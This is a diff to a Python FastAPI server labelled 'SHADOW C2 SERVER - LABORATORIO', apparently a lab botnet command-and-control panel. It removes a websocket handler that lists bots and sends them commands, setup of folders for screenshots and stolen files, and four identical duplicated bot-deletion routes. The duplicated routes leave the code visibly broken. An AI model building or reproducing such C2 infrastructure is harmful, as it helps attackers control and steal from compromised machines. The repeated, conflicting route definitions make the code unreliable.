@@ -310,46 +310,7 @@ async def c2_stealth_file(bot_id: str, request: Request):
 async def websocket_endpoint(websocket: WebSocket):
     await websocket.accept()
     client_id = str(uuid.uuid4())
-    active_connections[client_id] = websocket
-    try:
-        while True:
-            data = await websocket.receive_text()
-            message = json.loads(data)
-            if message.get("type") == "ping":
-                await websocket.send_text(json.dumps({"type": "pong"}))
-            elif message.get("type") == "get_stats":
-                await websocket.send_text(json.dumps({"type": "stats", "data": get_stats()}))
-            elif message.get("type") == "get_bots":
-                await websocket.send_text(json.dumps({"type": "bots", "data": get_bots()}))
-            elif message.get("type") == "send_command":
-                cmd_id = add_command(message.get("bot_id"), message.get("command"), message.get("args"))
-                await websocket.send_text(json.dumps({"type": "command_sent", "cmd_id": cmd_id}))
-    except WebSocketDisconnect:
-        del active_connections[client_id]
 
 if __name__ == "__main__":
-    (BASE_DIR / "static" / "screenshots").mkdir(parents=True, exist_ok=True)
-    (BASE_DIR / "static" / "files").mkdir(parents=True, exist_ok=True)
-    print("\n    ===========================================\n         SHADOW C2 SERVER - LABORATORIO\n    ===========================================\n    Panel Web:  http://localhost:8000\n    API Docs:   http://localhost:8000/docs\n    ===========================================\n    ")
+    import uvicorn
     uvicorn.run(app, host="0.0.0.0", port=8000)
-
-# ============ DELETE BOT ============
-@app.delete("/api/bots/{bot_id}/delete")
-async def delete_bot(bot_id: str):
-    delete_bot_from_db(bot_id)
-    return JSONResponse({"status": "deleted"})
-
-@app.delete("/api/bots/{bot_id}/delete")
-async def api_delete_bot(bot_id: str):
-    delete_bot(bot_id)
-    return JSONResponse({"status": "deleted", "bot_id": bot_id})
-
-@app.delete("/api/bots/{bot_id}/delete")
-async def api_delete_bot(bot_id: str):
-    delete_bot(bot_id)
-    return JSONResponse({"status": "deleted", "bot_id": bot_id})
-
-@app.delete("/api/bots/{bot_id}/delete")
-async def api_delete_bot(bot_id: str):
-    delete_bot(bot_id)
-    return JSONResponse({"status": "deleted", "bot_id": bot_id})
